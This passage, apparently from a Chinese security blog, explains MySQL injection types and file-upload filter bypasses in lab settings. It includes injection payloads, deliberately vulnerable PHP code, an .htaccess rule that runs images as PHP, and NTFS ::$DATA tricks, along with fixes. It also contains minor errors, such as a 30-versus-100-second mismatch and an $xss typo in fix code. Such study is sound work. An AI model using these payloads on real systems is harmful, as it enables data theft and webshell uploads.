常页面。所以呢，我们也进化了……出现了一个让sql命令执行成功的标志——sleep(),因为这个函数正常执行后能够让网站 出现延迟，比较直观什么是延时注入： 我上面一大堆不就讲的这个？ 延时注入出现场景1、确定存在注入点，且找到闭合方式2、用上述所有获取信息的sql语句无效（无回显数据）3、sleep函数未被禁用4、等我想起来再补充 涉及到的函数介绍及利用延时注入最常用的组合拳：（不含过滤的情况）sleep() if() substr() ascii() length()接下来简单解释一下各个函数的作用sleep(num) 使用sleep函数可以延长sql语句执行时间:select * from table_name where column_name=ST and sleep(N) 延长 N秒 sleep有效的条件： 使用sleep的sql语句的查询结果不为空 需要注意的几个点： 程序运行时间由sql语句的条件（where）来定 select sleep(N),column_name from table_name 每查询出一条数据延迟相对应的N秒,但出现的数据并不是说过了每条数据的延时时间就会出现，而是过了 全部数据所需要sleep时间总和后，才会出现所有的数据 select sleep(N),column_name from table_name where ………… 上面这条sql语句的执行时间会根据where限制后出现的数据来定（数据量-&gt;程序执行时间） MySQL sleep过多的影响及解决方法: 影响： 严重消耗mysql服务器资源(主要是cpu, 内存)，并可能导致mysql崩溃。 解决方法: SHOW GLOBAL VARIABLES LIKE &apos;wait_timeout&apos;; SHOW GLOBAL VARIABLES LIKE &apos;interactive_timeout&apos;; SET GLOBAL wait_timeout=30; SET GLOBAL interactive_timeout=30; wait_timeout, 即可设置睡眠连接超时秒数，如果某个连接超时，会被mysql自然终止 wait_timeout=30 #即设置mysql连接睡眠时间为100秒，任何sleep连接睡眠时间若超过100秒，将会被 mysql服务自然终止 if(条件,执行1,执行2) 与大多编程语言中的if函数相似，执行判断功能 条件： 返回值为bool类型 执行1： 条件参数返回值为 True 执行2： 条件参数返回值为 False 常用于与sleep的搭配： if(条件,sleep(N),1) 如果条件成立,程序延时N秒（出现延时就代表存在注入点，且可利用这一点获取数据库信息） 如：if(1&lt;2,sleep(1),sleep(2)) 条件为True 程序延时1秒substr() substr()两种表示法： substr(string,num_start,num_length); string为字符串 start为字符起始位置(起始位置为1) length为截取字符长度 substr(String from N for M) String为字符串 from 对应上面的num_start 字符起始位置 for 对应上面的 num_length 截断长度 使用substr()对字符串进行操作: select substr(&apos;hello&apos;,2) -&gt; ello select substr(&apos;hello&apos; from 2) -&gt; ello 如果忽略最后一个参数（截断长度）自动选取从开始位置到最后的字符串 select substr(&apos;hello&apos;,2,3) -&gt; ell select substr(&apos;hello&apos; from 2 for 3) -&gt; ell 这就是比较正常的使用方法（我没说上面的不正常啊）ascii() ascii()的作用为返回相应字符的ASCII编码，如果输入字符串或一串数字则会按第一个字符来进行返回相应的ASCII编码 select ascii(1) -&gt; 49 select ascii(&apos;a&apos;) -&gt; 97 一个单独的ascii()函数确实没什么大意思，但与上面的stbstr()、if(),sleep()来套组合拳，那就很厉害了 ascii(substr(String,Num_Start,1)) 利用substr来截取字符串的每一个字符来传递给ascii，ascii()函数呢再最终输出该字符的ascii编码 if(ascii(substr(String,Num_Start,1))=Num,sleep(N),1) 利用if来将ascii()函数返回的ascii编码进行判断（猜测）,如果猜测数据正好等于返回的ascii编码,那么 程序就进行延时N秒。 利用sleep()这个特性呢，就可以进行fuzz测试获取真实数据以达到注入目的length() length(String) 返回字符串长度 如：select length(database()); 返回当前数据库名长度 与ascii()函数一样，不打组合拳没什么威力 if(length(String)=Num,条件1,条件2) 在进行substr获取数据库、表、字段名之前，如果知道他们各自的字符串长度，在进行爆破名的过程中效率会 高跟多 获取数据库信息#获取当前数据库名长度and if(length(database())=Num,sleep(3),1)#获取所有数据库名长度and if(length((select group_concat(schema_name) from information_schema.schemata))=Num,sleep(3),1)#获取当前数据库名and if(ascii(substr(database(),N,1)=Num,sleep(3),1) N的大小由数据库名长度决定,Num的范围是 1~127 汉字除外上面已经说了具体获取数据库库名和长度的方法，表、字段等相关信息不再复述 Bool注入什么是Bool注入构造特定的sql语句 当条件成立时网页返回正常（and 1=1） 当条件不成立时网页出现错误（and 1=2）Bool注入使用的环境 1、正常注入流程无法使网页回显有效数据库信息 2、当构造的sql语句条件不成立时会返回与正常页面不同的信息（不成立的依据） 后端代码： &lt;?php error_reporting(0); //程序不报错 $con = mysqli_connect('127.0.0.1','root','****','test'); $id = $_GET['id']; $sql = \"select * from admin where id =$id limit 1\"; $res = mysqli_query($con,$sql); $row = mysqli_fetch_array($res);#重点##################################################################################### if($row)&#123; echo $row['username']; //条件正确，网页返回正常数据 &#125; else&#123; echo \"error\"; //条件错误，网页返回error &#125;#####################################################################################?&gt; 涉及到的sql函数及利用与延时注入相似，大多是将延时注入里面中的sleep()替换为1，与之相对的替换为0 为什么替换为1、0： 1在编程语言代表True 0在变成序言中代表False常用到的函数： if()、ascii()、length()、substr() 上述函数已经在延时注入里面介绍过了，这里不再造车轮利用Bool注入获取数据库信息： 注入环境： and 1=1 返回正常 and 1=2 返回错误 获取当前数据库名长度： and 1=if(length(database())=Num,1,0) 遍历Num 当条件成立时页面返回正常 获取当前数据库名： and 1=if(ascii(substr(database(),Num,1))=Num2,1,0) Num:截取database()第几个字符 遍历Num2获取该字符的ascii编码进行解码即可 剩下的表长度、表名、字段长度、字段名、字段信息都是通过这种方法获取的，方法，原理都是一样。不再复述 简单的防注入： &lt;?php error_reporting(0); $con = mysqli_connect('127.0.0.1','root','****','test'); $id = $_GET['id']; $id = mysqli_escape_string($id); //防注入 $sql = \"select * from admin where id ='$id' limit 1\"; //注意这里进行了单引号闭合,这两点一起才能防注入 $res = mysqli_query($con,$sql); $row = mysqli_fetch_array($res); if($row)&#123; echo $row['username']; &#125; else&#123; echo \"error\"; &#125;?&gt; ''' 这种简单的防注入不仅仅是应用在Bool注入，延时注入，二次注入，联合注入等注入攻击基本上都可以防御 ''' 二次注入什么是二次注入攻击者构造的恶意数据存储到数据库中，导致每次特定操作可引发恶意代码的执行。上述两个过程即为二次注入 1、将恶意数据（代码）插入到数据库中 2、攻击者特定行为使恶意代码从服务器中执行 二次注入的利用二次注入不像上面的延时注入、Bool注入、联合注入花样那么多，而且二次注入根据不同的环境也会存在不同的注入方法。在这里就以实战的形式来进行表达(sqllab 24题) 登陆界面： 后端代码： $username = mysql_real_escape_string($_POST[\"login_user\"]);$password = mysql_real_escape_string($_POST[\"login_password\"]);$sql = \"SELECT * FROM users WHERE username='$username' and password='$password'\";username password 都用了mysql_real_escape_string函数将敏感字符进行过滤，所以登录界面不存在什么注入 PHP mysql_real_escape_string() 函数防SQL注入注册用户功能： 后端代码： if (isset($_POST['submit']))&#123; $username= mysql_escape_string($_POST['username']); //将敏感字符过滤 $pass= mysql_escape_string($_POST['password']); //将敏感字符过滤 $re_pass= mysql_escape_string($_POST['re_password']); //将敏感字符过滤 echo \"&lt;font size='3' color='#FFFF00'&gt;\"; $sql = \"select count(*) from users where username='$username'\"; $res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( '); $row = mysql_fetch_row($res); //print_r($row); if (!$row[0]== 0) &#123; ?&gt; &lt;script&gt;alert(\"The username Already exists, Please choose a different username \")&lt;/script&gt;; &lt;?php header('refresh:1, url=new_user.php'); &#125; else &#123; if ($pass==$re_pass) &#123; # Building up the query........ $sql = \"insert into users ( username, password) values(\\\"$username\\\", \\\"$pass\\\")\"; mysql_query($sql) or die('Error Creating your user account, : '.mysql_error()); echo \"&lt;/br&gt;\"; ·················· 构造 Username: admin&apos;# 从后端源码可以看出 需要进行单引号闭合 password = admin 登录后进行密码修改 无论当前密码是什么，都可以修改成功 image-20191105204537626 能修改成功的原因： username：admin&apos;# 在进行修改密码的过程中用到了下面的sql语句： $sql = update table_name set password=new_password where username=admin&apos;# and curr_password=* 可以看到 # 将后面password的验证注释掉了。所以无论原密码是什么,都可以成功将密码修改 一道关于二次注入的CTF修复方案暂且能想到的办法是对用户输入的特殊字符进行过滤 搁置的问题 二次注入没有实现的代码 //输入数据代码（insert）&lt;form action=\"\" method=\"post\"&gt; name &lt;input type=\"text\" name=\"name\"&gt; &lt;/br&gt; passwd &lt;input type=\"password\" name=\"passwd\"&gt; &lt;/br&gt; &lt;input type='submit'&gt;&lt;/form&gt;&lt;?php$con = mysql_connect('localhost','root',\"****\",'testt');mysql_select_db('testt',$con);$name = $_POST['name'];$name = mysql_escape_string($name);$passwd = $_POST['passwd'];$passwd = mysql_escape_string($passwd);// $name = mysql_real_escape_string($name);// $sql = \"insert into test(id,user,passwd) values(NULL,\\\"$name\\\",\\\"$passwd\\\");\";// $res = mysql_query($sql,$con);$sql = \"insert into test ( user, passwd) values(\\\"$name\\\", \\\"$passwd\\\")\";mysql_query($sql) or die('Error Creating your user account, : '.mysql_error());?&gt; //更新数据代码 不知道哪出了问题，没有办法实现二次注入&lt;form action=\"\" method=\"post\"&gt; name &lt;input type=\"text\" name=\"name\"&gt; &lt;/br&gt; oldpasswd &lt;input type=\"password\" name=\"odpass\"&gt; &lt;/br&gt; passwd &lt;input type=\"password\" name=\"passwd\"&gt; &lt;/br&gt; &lt;input type='submit'&gt;&lt;/form&gt;&lt;?php$con = mysql_connect('localhost','root',\"****\");mysql_select_db('testt',$con);$passwd = $_POST['passwd'];$passwd = mysql_real_escape_string($passwd);$odpass = $_POST['odpass'];$odpass = mysql_real_escape_string($odpass);$name = $_POST['name'];$sql = \"UPDATE test SET passwd='$passwd' where user='$name' and passwd='$odpass'; \";echo $sql;$res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( ');$row = mysql_affected_rows();?&gt; 堆叠注入什么是堆叠注入平常我们注入时都是通过对原来sql语句传输数据的地方进行相关修改，注入情况会因为该语句本身的情况而受到相关限制。但堆叠注入的一条sql语句中存在多条功能不同的sql语句，其中每条不同功能的sql语句以 ; 结束。在特定情况下可以依次执行拼接好的sql语句。这样就突破了仅能对数据进行操作的限制，堆叠注入可以进行sql中所有的操作 堆叠注入使用的条件堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行。 后端代码 &lt;?php$con = mysqli_connect('localhost','root','****','testt');@$id = $_GET['id'];$sql = \"select * from test where id=$id;\";mysqli_multi_query($con,$sql); //支持执行多条sql语句$res = mysqli_store_result($con); //上一条sql语句执行结果储存在 mysqli_store_result（）。结果空返回NULL$row = mysqli_fetch_array($res);//返回形式类似于python中的字典只不过php有自己的数组输出方式var_dump($row);?&gt; ''' 正常情况下，程序是不会回显第一条sql语句分号后面的内容，但分号后面的sql语句会在数据库中正常执行 修复堆叠注入很简单，在其他条件不会触发sql注入的情况下将mysqli_multi_query() 替换为 mysqli_query()''' Insert、update注入什么是Insert、update注入在数据库中处理或更新字段信息时会用到其中的insert（插入新字段数据）、update（更新字段数据）函数来对数据进行修改。因为对数据库进行交互，后端代码没有进行严格的过滤或存在其他安全问题。当新的字段数据可控时，可能会导致sql注入等系列安全问题 后端代码&lt;?php$con = mysqli_connect('localhost','root','******','testt');@$name = $_GET['name'];@$passwd = $_GET['passwd'];$sql = \"insert into test values(NULL,'$name','$passwd')\";#'''上面是insert注入'''$sql = \"update test set passwd='$passwd' where user='$name'\";#'''这里是update注入'''mysqli_query($con,$sql);?&gt; 修复方案#如果后端代码对可控信息参数进行引号闭合，可以用下面转义的方法进行防御@$name = $_GET['name'];$name = addslashes($name);@$passwd = $_GET['passwd'];$passwd = addslashes($passwd);#如果后端代码没有对可控信息参数进行引号闭合，可采用特殊字符过滤的方法进行防御 留下的问题为什么上面的程序可以用and sleep(3) or&apos; 进行注入下面header头注入却要用 or sleep(3) or&apos; 来进行注入 解决上面出现的问题在解决问题之前，先了解一下 and、or 执行原理及mysql中处理字符串的原理 and： 当 and 前的条件为True时，and后面的（sql函数或sql语句）才执行 select 1 and sleep(2) #执行（ 1 代表True，&gt;1 完全成立） select 0 and sleep(2) #不执行（ 0 代表False） or： 当 or 前面的条件为False时，or 后面的（sql函数或sql语句）才执行 select 0 or sleep(2) # 执行 select 1 or sleep(2) # 不执行 在mysql中当字符串与数字进行比较时，如果字符串中的第一个字符是0-9任意数字，则在比较过程中会用第一个数字与其 进行比较，如果第一个字符是非整型则默认为0 select &quot;1a&quot;=1; =&gt; 1 select &quot;a&quot;=a; =&gt; 0#insert、update后端与数据库交互的部分代码$sql = &quot;insert into test values(NULL,&apos;$name&apos;,&apos;$passwd&apos;)&quot;; 当 $name 被传入的值为 123 时 可用 and 来进行触发延时注入（123&gt;1 = True） 当 $name 被传入的值为 &quot;asd&quot; 时 可用 or 来进行触发延时注入(&quot;asd&quot;= 0 =False)所以这就很好解释HTTP头注入大多用 or 而不用 and HTTP头获取的数据大多为字符型数据且第一个字符为非整型数据，所以要用or不用and。 如果host 存放的数据为 1.1.1.1 那 就要用 and 来触发 延时注入 HTTP头注入什么是HTTP{头注入先来看一段正常的请求包GET /test.php HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: values=adminDNT: 1Connection: closeUpgrade-Insecure-Requests: 1上面全部的都为请求包的Head部分，因为User-Agent（反爬虫）、Host（不明白的东西不能说）、Cookie（判断用户）这三个头所包含的数据存在特殊用处，所以有些网站会将他们及其对应的数据内容存放到数据库中，如果后端代码没有处理完善，进而导致sql注入因为Head头注入里面牵扯到的原理是一样的，所以我就用同一个后端代码来进行概括了 后端代码&lt;?php$con = mysqli_connect('localhost','root','******','testt');setcookie(\"values\",\"admin\"); //设置一个cookie 键值、键名$cookie = $_COOKIE['values']; // 获取请求中的Cookie信息echo \"COOKIE:\".$cookie.\"&lt;/br&gt;\";$xff = getenv('HTTP_X_FORWARDED_FOR'); // 获取XFF请求的数据信息echo $xff;$UA = $_SERVER['HTTP_USER_AGENT']; //获取请求中的User-Agentecho $UA.\"&lt;/br&gt;\";$host = $_SERVER[\"HTTP_HOST\"]; // 获取请求中的Hostecho $host.\"&lt;/br&gt;\";$sql = \"insert into db values('$cookie','$host','$UA')\";mysqli_query($con,$sql);?&gt; 修复方案$cookie = $_COOKIE['values']; // 获取请求中的Cookie信息$cookie = addslashes($cookie);//将数据内容进行转义$UA = $_SERVER['HTTP_USER_AGENT']; //获取请求中的User-Agent$UA = addslashes($UA);//将数据内容进行转义$xff = getenv('HTTP_X_FORWARDED_FOR'); //获取请求中的XFF$xff = addslashes($xss) //将数据内容进行转义$host = $_SERVER[\"HTTP_HOST\"]; // 获取请求中的Host$host = addslashes($host);//将数据内容进行转义 宽字节注入什么是宽字节注入一个gbk汉字占用两个字节，一个utf-8汉字占用三个字节。宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）PHP把&apos;转义为\\&apos;mysql 将%df\\&apos; 中的%df\\ 认为是一个GBK字符，所谓的吃掉了\\ 导致sql注入 宽字节编码的种类GB2312、GBK、GB18030、BIG5、Shift_JIS等 MySQL中用于转义的函数addslashesmysql_real_escape_stringmysql_escape_string以及后面在高版本被去除的magic_quote_gpc 后端代码&lt;?php$con = mysqli_connect('localhost','root',****,'testt');@$id = $_GET['id'];mysqli_query($con,\"set names gbk\"); //设置字符编码为GBK$id = addslashes($id); //将获取id的数据进行转义$sql = \"select * from test where id='$id'\";$res = mysqli_query($con,$sql) or die(mysqli_error());$row = mysqli_fetch_array($res);echo $row['user'].$ row['id'].$row['passwd'];?&gt; 修复方案1.设置character_set_client=binary，将数据以二进制形式传递 mysql客户端查看当前字符集 show variables like &quot;%char%&quot;; 在安装MySQL时可以设置服务器的默认编码格式，也可对my.ini做修改，修改[mysqld]里面的 character_set_server=utf8，则可设置character_set_server的值。2.矫正人们对于mysql_real_escape_string的误解，单独调用set names gbk和mysql_real_escape_string是无法避免宽 字符注入问题的。还得调用mysql_set_charset来设置一下字符集。3.谨慎使用iconv来转换字符串编码，很容易出现问题。只要我们把前端html/js/css所有编码设置成gbk，mysql/php编码设 置 成gbk，就不会出现乱码问题。不用画蛇添足地去调用iconv转换编码，造成不必要的麻烦。","categories":[{"name":"数据库安全","slug":"数据库安全","permalink":"http://yoursite.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://yoursite.com/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"}]},{"title":"文件上传漏洞类型总结","slug":"文件上传漏洞类型总结","date":"2019-11-28T01:37:38.000Z","updated":"2019-11-28T01:55:57.792Z","comments":true,"path":"2019/11/28/文件上传漏洞类型总结/","link":"","permalink":"http://yoursite.com/2019/11/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/","excerpt":"","text":"文件上传漏洞类型总结写在开始 文件上传不同类型有难易之分，简单类型简单处理 文件上传——前端绕过 前端代码 &lt;script type=\"text/javascript\"&gt; function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") &#123; alert(\"请选择要上传的文件!\"); return false; &#125; //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name) == -1) &#123; var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; &#125; &#125;&lt;/script&gt; 绕过原理： 检测程序为前端校验 绕过方法： 删除JavaScript代码 上传图片马，burp抓包将后缀改为原脚本后缀类型 文件上传——文件类型绕过 后端代码 if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 绕过原理： 程序只检测了上传文件的文件类型 绕过方法： 上传图片改文件后缀 上传脚本文件，改文件类型 文件上传——不同脚本文件类型解析绕过 后端代码 if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; &#125; 绕过原理： 程序未对可以解析php文件的其他类型进行过滤 服务器支持未进行过滤的其他文件类型进行解析php 绕过方法： 上传能够解析的php文件后缀：phtml、php5 等 服务器开启phtml，php5解析 打开配置文件 httpd.conf 添加语句 AddType application/x-httpd-php .php .phtml .phps .php5 .pht（如果存在，将前面的注释删除） 文件上传——.htaccess文件上传绕过 后端代码 $is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传!'; &#125; .htaccess是什么 笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。 htaccess详解及.htaccess参数说明 .htaccess 文件的简单编写 &lt;FilesMatch \"php.png\"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 上面简单的代码是服务器里面的 php.png 特定文件内容解析为php 绕过原理： 程序未对.htaccess 黑名单过滤且上传文件的文件名不会发生改变 绕过方法： 编写并上传.htaccess 文件 利用其特性可将文件类型定将解析为脚本类型 文件上传——文件类型大小写绕过 后端代码 $is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; 绕过原理： 程序没有将上传文件名进行统一大小写处理 绕过方法： 文件类型后缀大小写处理后进行上传 注意事项： Linux系统的文件名是区分大小写的，所以该上传方法不适用于Linux服务器 文件上传——后缀名加空格绕过后端代码 $is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; 绕过原理： 程序没有对文件后缀名去空处理 绕过方法 文件上传burp抓包修改后缀加个空格 文件上传——后缀名加 . 绕过 后端代码 $is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; 绕过原理： 程序没有对后缀名进行去”.”处理，利用windows特性，会自动去掉后缀名中最后的”.”， 绕过方法： 可在后缀名中加”.”绕过 文件上传——NTFS ADS 文件流绕过检测 后端代码 $is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; 绕过原理： 程序没有对后缀名进行去”::$DATA”处理 ，如果上传的文件名字为：test.php::$DATA，会在服务器上生成一个test.php的文件，其中内容和所上传文件内容相同，并被解析 上传 Test.php:a.jpg 生成Test.php 文件内容为空上传 Test.php::$DATA 生成test.php 文件内容为&lt;?php phpinfo();?&gt;上传 Test.php::$INDEX_ALLOCATION 生成test.php文件夹上传 Test.php::$DATA\\0.jpg 生成0.jpg 文件内容为&lt;?php phpinfo();?&gt;上传 Test.php::$DATA\\aaa.jpg 生成aaa.jpg 文件内容为&lt;?php phpinfo();?&gt;PS: 上传test.php:a.jpg的时候其实是在服务器上正常生成了一个数据流文件，可以通过notepad test.php:a.jpg查看内容，而test.php为空也是正常的。 绕过方法： 上传文件后缀加 ::$DATA 文件上传——文件名加. .绕过后端代码： $is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = 